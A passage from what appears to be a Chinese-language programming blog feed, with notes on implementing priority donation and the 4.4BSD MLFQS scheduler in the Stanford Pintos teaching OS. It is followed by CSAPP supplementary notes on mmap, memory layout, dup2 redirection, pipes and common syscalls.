function_">thread_hold_the_lock</span><span class="params">(<span class="keyword">struct</span> lock *lock)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">intr_level</span> <span class="title">old_level</span> =</span> intr_disable ();</span><br><span class="line">  list_insert_ordered (&amp;thread_current ()-&gt;locks, &amp;lock-&gt;elem, lock_cmp_priority, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (lock-&gt;max_priority &gt; thread_current ()-&gt;priority) <span class="comment">//锁的优先级&gt;当前线程的优先级</span></span><br><span class="line">  &#123;</span><br><span class="line">    thread_current ()-&gt;priority = lock-&gt;max_priority; <span class="comment">//提高当前线程优先级</span></span><br><span class="line">    thread_yield (); <span class="comment">//重新调度</span></span><br><span class="line">  &#125;</span><br><span class="line">  intr_set_level (old_level);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="thread-remove-lock"><a href="#thread-remove-lock" class="headerlink" title="thread_remove_lock"></a>thread_remove_lock</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Remove a lock. */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">thread_remove_lock</span> <span class="params">(<span class="keyword">struct</span> lock *lock)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">intr_level</span> <span class="title">old_level</span> =</span> intr_disable ();</span><br><span class="line">  list_remove (&amp;lock-&gt;elem); <span class="comment">//把锁从list中删除</span></span><br><span class="line">  thread_update_priority (thread_current ()); <span class="comment">//更新优先级</span></span><br><span class="line">  intr_set_level (old_level);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="thread-update-priority"><a href="#thread-update-priority" class="headerlink" title="thread_update_priority"></a>thread_update_priority</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Update priority. */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">thread_update_priority</span> <span class="params">(<span class="keyword">struct</span> thread *t)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> <span class="title">intr_level</span> <span class="title">old_level</span> =</span> intr_disable ();</span><br><span class="line">  <span class="type">int</span> max_priority = t-&gt;base_priority;</span><br><span class="line">  <span class="type">int</span> lock_priority;</span><br><span class="line">  <span class="comment">//如果该线程正占有某个锁，就取用其优先级最高的和线程被捐赠的最高优先级相比较</span></span><br><span class="line">  <span class="keyword">if</span> (!list_empty (&amp;t-&gt;locks))</span><br><span class="line">  &#123;</span><br><span class="line">    list_sort (&amp;t-&gt;locks, lock_cmp_priority, <span class="literal">NULL</span>);</span><br><span class="line">    lock_priority = list_entry (list_front (&amp;t-&gt;locks), <span class="keyword">struct</span> lock, elem)-&gt;max_priority;</span><br><span class="line">    <span class="keyword">if</span> (lock_priority &gt; max_priority)</span><br><span class="line">      max_priority = lock_priority;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  t-&gt;priority = max_priority;</span><br><span class="line">  intr_set_level (old_level);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="再测试"><a href="#再测试" class="headerlink" title="再测试"></a>再测试</h2><img src="https://img.lfalive.top/CS140-project/result3.png" style="zoom:50%;" /><h1 id="Advanced-Scheduler"><a href="#Advanced-Scheduler" class="headerlink" title="Advanced Scheduler"></a>Advanced Scheduler</h1><p>Implement a multilevel feedback queue scheduler similar to the 4.4BSD scheduler to reduce the average response time for running jobs on your system. See section <a href="https://web.stanford.edu/~ouster/cgi-bin/cs140-spring20/pintos/pintos_7.html#SEC131">B. 4.4BSD Scheduler</a>, for detailed requirements.</p><p>Like the priority scheduler, the advanced scheduler chooses the thread to run based on priorities. However, the advanced scheduler does not do priority donation. Thus, we recommend that you have the priority scheduler working, except possibly for priority donation, before you start work on the advanced scheduler.</p><p>You must write your code to allow us to choose a scheduling algorithm policy at Pintos startup time. By default, the priority scheduler must be active, but we must be able to choose the 4.4BSD scheduler with the -mlfqs kernel option. Passing this option sets <code>thread_mlfqs</code>, declared in <code>threads/thread.h</code>, to true when the options are parsed by <code>parse_options()</code>, which happens early in <code>main()</code>.</p><p>When the 4.4BSD scheduler is enabled, threads no longer directly control their own priorities. The priority argument to <code>thread_create()</code> should be ignored, as well as any calls to <code>thread_set_priority()</code>, and <code>thread_get_priority()</code> should return the thread’s current priority as set by the scheduler.</p><h2 id="计算公式"><a href="#计算公式" class="headerlink" title="计算公式"></a>计算公式</h2><p><a href="https://web.stanford.edu/~ouster/cgi-bin/cs140-spring20/pintos/pintos_7.html#SEC131">计算公式指导书</a></p><p>以下公式总结了实现调度程序所需的计算，但不是调度程序要求的完整描述。</p><p>每个线程在其控制下都有一个介于-20和20之间的<code>nice</code>值。每个线程还有一个优先级，介于<code>0(PRI_MIN)</code>到<code>63(PRI_MAX)</code>之间，每四个tick使用以下公式重新计算一次：</p><center><b>priority = PRI_MAX - (recent_cpu/4) - (nice*2)</b></center><p><code>recent_cpu</code>测量线程“最近“收到的CPU数。在每个计时器tick中，正在运行的线程的<code>recent_cpu</code>增加1。每个线程的<code>recent_cpu</code>以这种方式每秒更新一次：</p><center><b>recent_cpu = (2*load_avg) / (2*load_avg + 1) * recent_cpu + nice</b></center><p><code>load_avg</code>估计过去一分钟就绪的平均线程数，它在启动时初始化为0，并每秒重新计算一次，如下所示：</p><center><b>load_avg = (59/60) * load_avg + (1/60) * ready_threads</b></center><p>其中<code>ready_threads</code>是正在运行或就绪的线程数（不包括空闲线程）。</p><h2 id="浮点数运算规则"><a href="#浮点数运算规则" class="headerlink" title="浮点数运算规则"></a>浮点数运算规则</h2><p>The following table summarizes how fixed-point arithmetic operations can be implemented in C. In the table, <code>x</code> and <code>y</code> are fixed-point numbers, <code>n</code> is an integer, fixed-point numbers are in signed p.q format where p + q &#x3D; 31, and <code>f</code> is <code>1 &lt;&lt; q</code> ：</p><table><thead><tr><th>Description</th><th>Expression</th></tr></thead><tbody><tr><td>Convert <code>n</code> to fixed point:</td><td><code>n * f</code></td></tr><tr><td>Convert <code>x</code> to integer (rounding toward zero):</td><td><code>x / f</code></td></tr><tr><td>Convert <code>x</code> to integer (rounding to nearest):</td><td><code>(x + f / 2) / f</code> if <code>x &gt;= 0</code>,  <code>(x - f / 2) / f</code> if <code>x &lt;= 0</code>.</td></tr><tr><td>Add <code>x</code> and <code>y</code>:</td><td><code>x + y</code></td></tr><tr><td>Subtract <code>y</code> from <code>x</code>:</td><td><code>x - y</code></td></tr><tr><td>Add <code>x</code> and <code>n</code>:</td><td><code>x + n * f</code></td></tr><tr><td>Subtract <code>n</code> from <code>x</code>:</td><td><code>x - n * f</code></td></tr><tr><td>Multiply <code>x</code> by <code>y</code>:</td><td><code>((int64_t) x) * y / f</code></td></tr><tr><td>Multiply <code>x</code> by <code>n</code>:</td><td><code>x * n</code></td></tr><tr><td>Divide <code>x</code> by <code>y</code>:</td><td><code>((int64_t) x) * f / y</code></td></tr><tr><td>Divide <code>x</code> by <code>n</code>:</td><td><code>x / n</code></td></tr></tbody></table><h2 id="devices-x2F-timer-c-1"><a href="#devices-x2F-timer-c-1" class="headerlink" title="devices&#x2F;timer.c"></a>devices&#x2F;timer.c</h2><p>在<code>timer_interrupt</code>中，每<code>TIMER_FREQ</code>时间（系统默认值是100）更新一次系统<code>load_avg</code>和所有线程的<code>recent_cpu</code>；每4个ticks更新一次线程优先级；每个timer_tick，running线程的<code>recent_cpu</code>递增。本质上还是优先级调度，保留之前写的优先级调度代码，在优先级捐赠相关函数中加<code>thread_mlfqs</code>判断。在<code>timer_interrupt</code>函数中加入如下代码。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (thread_mlfqs)</span><br><span class="line">&#123;</span><br><span class="line">  thread_mlfqs_increase_recent_cpu ();</span><br><span class="line">  <span class="keyword">if</span> (ticks % TIMER_FREQ == <span class="number">0</span>) thread_mlfqs_update_load_avg_and_recent_cpu ();</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (ticks % <span class="number">4</span> == <span class="number">0</span>) thread_mlfqs_update_priority (thread_current ());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="threads-x2F-thread-c-1"><a href="#threads-x2F-thread-c-1" class="headerlink" title="threads&#x2F;thread.c"></a>threads&#x2F;thread.c</h2><p>在thread结构体中加入int成员<code>nice</code>和<code>recent_cpu</code>。然后在<code>init_thread</code>中进行初始化。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">t-&gt;nice = <span class="number">0</span>;</span><br><span class="line">t-&gt;recent_cpu = FP_CONST (<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>定义全局变量<code>static int load_avg;</code>，然后在<code>thread_init</code>中将其初始化<code>load_avg = FP_CONST (0);</code>。</p><h3 id="浮点数运算"><a href="#浮点数运算" class="headerlink" title="浮点数运算"></a>浮点数运算</h3><p>在代码靠前位置加入浮点数运算相关的定义。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 浮点运算相关 */</span></span><br><span class="line"><span class="comment">/* Convert a value to fixed-point value. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FP_CONST(A) ((int)(A &lt;&lt; 16))</span></span><br><span class="line"><span class="comment">/* Add two fixed-point value. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FP_ADD(A,B) (A + B)</span></span><br><span class="line"><span class="comment">/* Add a fixed-point value A and an int value B. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FP_ADD_MIX(A,B) (A + (B &lt;&lt; 16))</span></span><br><span class="line"><span class="comment">/* Substract two fixed-point value. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FP_SUB(A,B) (A - B)</span></span><br><span class="line"><span class="comment">/* Substract an int value B from a fixed-point value A */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FP_SUB_MIX(A,B) (A - (B &lt;&lt; 16))</span></span><br><span class="line"><span class="comment">/* Multiply a fixed-point value A by an int value B. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FP_MULT_MIX(A,B) (A * B)</span></span><br><span class="line"><span class="comment">/* Divide a fixed-point value A by an int value B. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FP_DIV_MIX(A,B) (A / B)</span></span><br><span class="line"><span class="comment">/* Multiply two fixed-point value. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FP_MULT(A,B) ((int)(((int64_t) A) * B &gt;&gt; 16))</span></span><br><span class="line"><span class="comment">/* Divide two fixed-point value. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FP_DIV(A,B) ((int)((((int64_t) A) &lt;&lt; 16) / B))</span></span><br><span class="line"><span class="comment">/* Get integer part of a fixed-point value. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FP_INT_PART(A) (A &gt;&gt; 16)</span></span><br><span class="line"><span class="comment">/* Get rounded integer of a fixed-point value. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FP_ROUND(A) (A &gt;= 0 ? ((A + (1 <span class="string">&lt;&lt; (16 - 1))) &gt;</span>&gt; 16) : ((A - (1 <span class="string">&lt;&lt; (16 - 1))) &gt;</span>&gt; 16))</span></span><br></pre></td></tr></table></figure><p>这里用低16位数作为浮点数的小数部分，无论什么运算一定要维持整数部分从第17位开始。</p><h3 id="recent-cpu-amp-load-avg"><a href="#recent-cpu-amp-load-avg" class="headerlink" title="recent_cpu &amp; load_avg"></a>recent_cpu &amp; load_avg</h3><p><code>timer_interrupt</code>中涉及的三个函数如下，分别是递增<code>recent_cpu</code>、更新优先级、更新<code>load_avg</code>及<code>recent_cpu</code>。计算逻辑即参考公式。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Update priority. */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">thread_mlfqs_update_priority</span> <span class="params">(<span class="keyword">struct</span> thread *t)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (t == idle_thread) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  ASSERT (thread_mlfqs);</span><br><span class="line">  <span class="comment">/* 计算priority */</span></span><br><span class="line">  t-&gt;priority = FP_INT_PART (FP_SUB_MIX (FP_SUB (FP_CONST (PRI_MAX), FP_DIV_MIX (t-&gt;recent_cpu, <span class="number">4</span>)), <span class="number">2</span> * t-&gt;nice));</span><br><span class="line">  t-&gt;priority = t-&gt;priority &lt; PRI_MIN ? PRI_MIN : t-&gt;priority;</span><br><span class="line">  t-&gt;priority = t-&gt;priority &gt; PRI_MAX ? PRI_MAX : t-&gt;priority;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Increase recent_cpu by 1. */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">thread_mlfqs_increase_recent_cpu</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  ASSERT (thread_mlfqs);</span><br><span class="line">  ASSERT (intr_context ());</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">current_thread</span> =</span> thread_current ();</span><br><span class="line">  <span class="keyword">if</span> (current_thread == idle_thread) <span class="keyword">return</span>;</span><br><span class="line">  current_thread-&gt;recent_cpu = FP_ADD_MIX (current_thread-&gt;recent_cpu, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Every per second to refresh load_avg and recent_cpu of all threads. */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">thread_mlfqs_update_load_avg_and_recent_cpu</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  ASSERT (thread_mlfqs);</span><br><span class="line">  ASSERT (intr_context ());</span><br><span class="line">  <span class="comment">/* 计算ready_threads */</span></span><br><span class="line">  <span class="type">size_t</span> ready_threads = list_size (&amp;ready_list);</span><br><span class="line">  <span class="keyword">if</span> (thread_current () != idle_thread) ready_threads++;</span><br><span class="line">  <span class="comment">/* 计算load_avg */</span></span><br><span class="line">  load_avg = FP_ADD (FP_DIV_MIX (FP_MULT_MIX (load_avg, <span class="number">59</span>), <span class="number">60</span>), FP_DIV_MIX (FP_CONST (ready_threads), <span class="number">60</span>));</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">t</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">list_elem</span> *<span class="title">e</span> =</span> list_begin (&amp;all_list);</span><br><span class="line">  <span class="comment">/* update recent_cpu */</span></span><br><span class="line">  <span class="keyword">while</span> (e != list_end (&amp;all_list))</span><br><span class="line">  &#123;</span><br><span class="line">    t = list_entry(e, <span class="keyword">struct</span> thread, allelem);</span><br><span class="line">    <span class="keyword">if</span> (t != idle_thread)</span><br><span class="line">    &#123;</span><br><span class="line">      t-&gt;recent_cpu = FP_ADD_MIX (FP_MULT (FP_DIV (FP_MULT_MIX (load_avg, <span class="number">2</span>), FP_ADD_MIX (FP_MULT_MIX (load_avg, <span class="number">2</span>), <span class="number">1</span>)), t-&gt;recent_cpu), t-&gt;nice);</span><br><span class="line">      thread_mlfqs_update_priority (t);</span><br><span class="line">    &#125;</span><br><span class="line">    e = list_next (e);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后完善头文件中已经写好的几个函数原型。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Sets the current thread&#x27;s nice value to NICE. */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">thread_set_nice</span> <span class="params">(<span class="type">int</span> nice UNUSED)</span> </span><br><span class="line">&#123;</span><br><span class="line">  thread_current ()-&gt;nice = nice;</span><br><span class="line">  thread_mlfqs_update_priority (thread_current ());</span><br><span class="line">  thread_yield (); <span class="comment">//重新调度</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Returns the current thread&#x27;s nice value. */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">thread_get_nice</span> <span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> thread_current ()-&gt;nice;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Returns 100 times the system load average. */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">thread_get_load_avg</span> <span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> FP_ROUND (FP_MULT_MIX (load_avg, <span class="number">100</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Returns 100 times the current thread&#x27;s recent_cpu value. */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">thread_get_recent_cpu</span> <span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> FP_ROUND (FP_MULT_MIX (thread_current ()-&gt;recent_cpu, <span class="number">100</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h2><p>测试的时候，发现mlfqs测试的默认时限为60s，测试时很容易因为超时而终止，暂不清楚这与模拟器是qemu&#x2F;bochs是否有关。以运行mlfqs-load-60为例，需要计算180s左右的load。Timer在整个程序执行过程中经历了18827个tick，约为188s。</p><img src="https://img.lfalive.top/CS140-project/9.png" style="zoom: 50%;" /><p>此时，修改src&#x2F;tests&#x2F;threads&#x2F;Make.tests文件末尾的TIMEOUT参数，把默认值60改掉（如改为200）后，测试可以通过。</p><img src="https://img.lfalive.top/CS140-project/10.png" style="zoom:50%;" /><p>最终测试结果如下：</p><img src="https://img.lfalive.top/CS140-project/result4.png" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> concurrency </category>
          
      </categories>
      
      
        <tags>
            
            <tag> concurrency </tag>
            
            <tag> stanford </tag>
            
            <tag> pintos </tag>
            
            <tag> bochs </tag>
            
            <tag> qemu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP相关若干问题的补充整理</title>
      <link href="/2022/01/10/CSAPP-plus/"/>
      <url>/2022/01/10/CSAPP-plus/</url>
      
        <content type="html"><![CDATA[<h1 id="内存映射的概念，mmap-的使用"><a href="#内存映射的概念，mmap-的使用" class="headerlink" title="内存映射的概念，mmap()的使用"></a>内存映射的概念，<code>mmap()</code>的使用</h1><ul><li>内存映射文件技术是操作系统提供的一种新的文件数据存取机制，利用内存映射文件技术，系统可以在内存空间中为文件保留一部分空间，并将文件映射到这块保留空间，一旦文件被映射后，操作系统将管理页映射缓冲以及高速缓冲等任务，而不需要调用分配、释放内存块和文件输入&#x2F;输出的API函数，也不需要自己提供任何缓冲算法。</li><li>使用内存映射文件处理存储于磁盘上的文件时，将不必再对文件执行I&#x2F;O 操作，这意味着在对文件进行处理时将不必再为文件申请并分配缓存，所有的文件缓存操作均由系统直接管理，由于取消了将文件数据加载到内存、数据从内存到文件的回写以及释放内存块等步骤，使得内存映射文件在处理大数据量的文件时能起到相当重要的作用。Memory Mapping是进行文件I&#x2F;O的高效方法。</li></ul><p>在linux中，如果通过<code>malloc()</code>来申请一块大的内存，C库就会在<code>memory mapping segment</code>中创建一个匿名<code>memory mapping</code>而不是使用堆空间。这里的“大”意味着大于<code>MMAP_THRESHOLD</code>字节，该阈值可以通过<code>mallopt()</code>来进行调整。</p><p><code>mmap()</code>将一个文件或者其它对象映射进内存。文件被映射到多个页上，如果文件的大小不是所有页的大小之和，最后一个页不被使用的空间将会清零。<code>mmap()</code>在用户空间映射调用系统中作用很大。</p><p><strong>头文件</strong></p><p> <code>&lt;sys/mman.h&gt;</code></p><p><strong>原型</strong></p><p><code>void* mmap(void* start,size_t length,int prot,int flags,int fd,off_t offset);</code></p><p><code>int munmap(void* start,size_t length);</code></p><p><strong>参数说明</strong></p><p>start：映射区的开始地址，设置为0时表示由系统决定映射区的起始地址。</p><p>length：映射区的长度。&#x2F;&#x2F;长度单位是 以字节为单位，不足一内存页按一内存页处理</p><p>prot：期望的内存保护标志，不能与文件的打开模式冲突。是以下的某个值，可以通过or运算合理地组合在一起</p><table><thead><tr><th>值</th><th>解释</th></tr></thead><tbody><tr><td>PROT_EXEC</td><td>页内容可以被执行</td></tr><tr><td>PROT_READ</td><td>页内容可以被读取</td></tr><tr><td>PROT_WRITE</td><td>页可以被写入</td></tr><tr><td>PROT_NONE</td><td>页不可访问</td></tr></tbody></table><p>flags：指定映射对象的类型，映射选项和映射页是否可以共享。它的值可以是一个或者多个以下位的组合体</p><p>MAP_FIXED、MAP_SHARED、MAP_PRIVATE、MAP_DENYWRITE、MAP_EXECUTABLE、MAP_NORESERVE、MAP_LOCKED、MAP_GROWSDOWN、MAP_ANONYMOUS、MAP_ANON、MAP_FILE、MAP_32BIT、MAP_POPULATE、MAP_NONBLOCK。</p><p>fd：有效的文件描述符。一般是由open()函数返回，其值也可以设置为-1，此时需要指定flags参数中的MAP_ANON，表明进行的是匿名映射。</p><p>offset：被映射对象内容的起点。</p><h1 id="BitMap：基于位的映射"><a href="#BitMap：基于位的映射" class="headerlink" title="BitMap：基于位的映射"></a>BitMap：基于位的映射</h1><p><strong>优点</strong>：</p><ol><li><p>运算效率高，不许进行比较和移位；</p></li><li><p>占用内存少，比如N&#x3D;10000000；只需占用内存为N&#x2F;8&#x3D;1250000Byte&#x3D;1.25M。</p></li></ol><p><strong>缺点</strong>：所有的数据不能重复。即不可对重复的数据进行排序和查找。   </p><p>BitMap可以使用在CSAPP的malloc lab中时，和链表相结合。举例说明，对于size&gt;&#x3D;512 Bytes的空闲块，使用传统的链表方法进行组织；其余较小空闲块，使用BitMap标记。将size&lt;512 Bytes的空闲块，分为大小为32、 64、96……480、512的固定块，每种大小空闲块的数量也是预先设定好的，且使用各自的BitMap来标记某空闲块是否已分配。这是某种意义上的32Bytes对齐，是为了做到，可以根据一个块的地址，确定该块的大小和在对应BitMap的比特位。分配时，采用向上取整的策略 ，不拆分空白块。</p><h1 id="程序内存映像结构"><a href="#程序内存映像结构" class="headerlink" title="程序内存映像结构"></a>程序内存映像结构</h1><p><img src="https://img.lfalive.top/CSAPP-plus/1.png"></p><h2 id="代码段-Text-Segment"><a href="#代码段-Text-Segment" class="headerlink" title="代码段 Text Segment"></a>代码段 Text Segment</h2><p>这里存放的是CPU要执行的指令。代码段是可共享的，相同的代码在内存中只会有一个拷贝，同时这个段是只读的，防止程序由于错误而修改自身的指令。</p><h2 id="初始化数据段-Data-Segment"><a href="#初始化数据段-Data-Segment" class="headerlink" title="初始化数据段 Data Segment"></a>初始化数据段 Data Segment</h2><p>这里存放的是程序中需要明确赋初始值的变量。例如初始化为非0的全局变量。</p><h2 id="BSS-Block-Started-by-Symbol-段-BSS-Segment"><a href="#BSS-Block-Started-by-Symbol-段-BSS-Segment" class="headerlink" title="BSS(Block Started by Symbol)段 BSS Segment"></a>BSS(Block Started by Symbol)段 BSS Segment</h2><p>未初始化，以及初始化为0或null的变量。</p><h2 id="堆-Heap"><a href="#堆-Heap" class="headerlink" title="堆 Heap"></a>堆 Heap</h2><p>堆提供了程序运行时的内存分配，C语言中，堆内存分配接口是malloc()及相关函数。除此之外，堆内存空间可以通过<code>brk()</code><strong>系统调用</strong>来增长，以便有足够的空间来分配。<strong>地址增大，堆变大。</strong></p><h2 id="内存映射段-Memory-Mapping-Segment"><a href="#内存映射段-Memory-Mapping-Segment" class="headerlink" title="内存映射段 Memory Mapping Segment"></a>内存映射段 Memory Mapping Segment</h2><p>这里被内核用来把文件内容直接映射到内存。可以使用linux提供的mmap()来进行这样的映射。<strong>地址增大，Memory Mapping Segment变大。</strong></p><h2 id="栈-Stack"><a href="#栈-Stack" class="headerlink" title="栈 Stack"></a>栈 Stack</h2><p>函数中的局部变量以及在函数调用过程中产生的临时变量都保存在此段中。进程中的每个线程都有自己的栈。<strong>地址减小，栈变大。</strong></p><h1 id="shell如何实现重定向和pipe"><a href="#shell如何实现重定向和pipe" class="headerlink" title="shell如何实现重定向和pipe"></a>shell如何实现重定向和pipe</h1><h2 id="使用dup2进行重定向"><a href="#使用dup2进行重定向" class="headerlink" title="使用dup2进行重定向"></a>使用dup2进行重定向</h2><p>头文件<code>&lt;unistd.h&gt;</code></p><p><code>int dup2(int oldfd, int newfd);</code></p><p>dup2可以用参数newfd指定新文件描述符的数值。若参数newfd已经被程序使用，则系统就会将newfd所指的文件关闭，若newfd等于oldfd，则返回newfd，而不关闭newfd所指的文件。dup2所复制的文件描述符与原来的文件描述符共享各种文件状态。共享所有的锁定，读写位置和各项权限或flags等。</p><p>在shell的重定向功能中，(输入重定向”&lt;”和输出重定向”&gt;”)就是通过调用dup或dup2函数对标准输入和标准输出的操作来实现的。</p><p><code>dup2(fd, 1);</code>命令即是使用fd指定的文件来替代标准输出。</p><h2 id="实现pipe"><a href="#实现pipe" class="headerlink" title="实现pipe"></a>实现pipe</h2><p>管道命令操作符是：<code>|</code> ，它能处理前面一个指令传出的正确输出信息，也就是standard output的信息，将其传递给下一个命令，作为标准输入standard input。它仅能处理standard output的信息，对于standard error信息没有直接处理能力。</p><p>在每个<code>|</code>后面接的第一个数据必定是『命令』，而且这个命令必须要能够接受standard input的数据才行。</p><p><strong>常用：</strong></p><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>cut</td><td>选取命令。从一行数据中取出想要的部分，选取信息通常以“行”来分析，并不是整篇信息分析的。</td></tr><tr><td>grep</td><td>选取命令。分析一行信息，若当中有感兴趣的信息，就将该行拿出来，可以用于正则表达式。</td></tr><tr><td>sort</td><td>排序命令。根据不同的数据类型进行排序，排序的字符与语系的编码有关。</td></tr><tr><td>wc</td><td>排序命令。常用于统计一个目录中包含多少文件（多少行，多少字，多少字符）。</td></tr><tr><td>uniq</td><td>排序命令。这个命令用来将重复的行删除掉只显示一个，需要配合排序过的文件来处理。</td></tr><tr><td>tee</td><td>双向重定向。tee会同时将数据流分送到文件去与屏幕(screen)；而输出到屏幕的，其实就是stdout，可以让下个命令继续处理。</td></tr><tr><td>tr</td><td>字符转换命令。tr可以用来删除一段信息当中的文字，或者是进行文字信息的替换。</td></tr><tr><td>col</td><td>字符转换命令。将tab键转换成对等的空格键。</td></tr><tr><td>join</td><td>字符转换命令。处理两个文件之间的数据。两个文件当中，有 “相同数据” 的那一行，加在一起。</td></tr><tr><td>paste</td><td>字符转换命令。将两行贴在一起，且中间以[tab]键隔开。</td></tr><tr><td>expand</td><td>字符转换命令。将[tab]按键转成空格键。</td></tr><tr><td>split</td><td>切割命令。如果文件太大，可以使用split将一个大文件依据文件大小或行数来切割成为小文件。</td></tr><tr><td>xargs</td><td>参数代换。读入 stdin 的数据，并且以空格符或断行字符作为分辨，将stdin的数据分隔成为arguments。</td></tr><tr><td>减号-</td><td>在管道命令中，经常会用到前一个命令的stdout作为这次的stdin，某些命令需要用到文件名来进行处理时，该stdin与stdout可以利用减号“-”来替代。</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> 2.txt | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -i</span></span><br><span class="line">abc</span><br><span class="line">hello</span><br><span class="line">hello1</span><br><span class="line">WOrld</span><br></pre></td></tr></table></figure><p><code>pipe()</code>可用于创建一个管道，以实现进程间的通信。</p><p><strong>头文件</strong><code>&lt;unistd.h&gt;</code></p><p><strong>函数原型</strong><code>int pipe(int fd[2]);</code></p><p>通过<code>pipe()</code>创建的这两个文件描述符<code>fd[0]</code>和<code>fd[1]</code>分别构成管道的两端，往<code>fd[1]</code>写入的数据可以从<code>fd[0]</code>读出。并且<code>fd[1]</code>一端只能进行写操作，<code>fd[0]</code>一端只能进行读操作，不能反过来使用。要实现双向数据传输，可以使用两个管道。向管道读写数据其实是在读写内核缓冲区。</p><h2 id="pipe与重定向区别"><a href="#pipe与重定向区别" class="headerlink" title="pipe与重定向区别"></a>pipe与重定向区别</h2><p><strong>pipe</strong>：左边的命令应该有标准输出 | 右边的命令应该接受标准输入<br><strong>重定向</strong>：左边的命令应该有标准输出 &gt; 右边只能是文件；左边的命令应该需要标准输入 &lt; 右边只能是文件</p><p><strong>管道</strong>触发两个子进程执行”|”两边的程序；而<strong>重定向</strong>是在一个进程内执行。</p><h1 id="syscall和system-library"><a href="#syscall和system-library" class="headerlink" title="syscall和system library"></a>syscall和system library</h1><h2 id="常用syscall"><a href="#常用syscall" class="headerlink" title="常用syscall"></a>常用syscall</h2><table><thead><tr><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>read</td><td>Read file</td></tr><tr><td>write</td><td>Write file</td></tr><tr><td>open</td><td>Open file</td></tr><tr><td>close</td><td>Close file</td></tr><tr><td>stat</td><td>Get info about file</td></tr><tr><td>mmap</td><td>Map memory page to file</td></tr><tr><td>brk</td><td>Reset the top of the heap</td></tr><tr><td>dup2</td><td>Copy file descriptor</td></tr><tr><td>pause</td><td>Suspend process until signal arrives</td></tr><tr><td>alarm</td><td>Schedule delivery of alarm signal</td></tr><tr><td>getpid</td><td>Get process ID</td></tr><tr><td>fork</td><td>Create process</td></tr><tr><td>execve</td><td>Execute a program</td></tr><tr><td>_exit</td><td>Terminate process</td></tr><tr><td>wait4</td><td>Wait for a process to 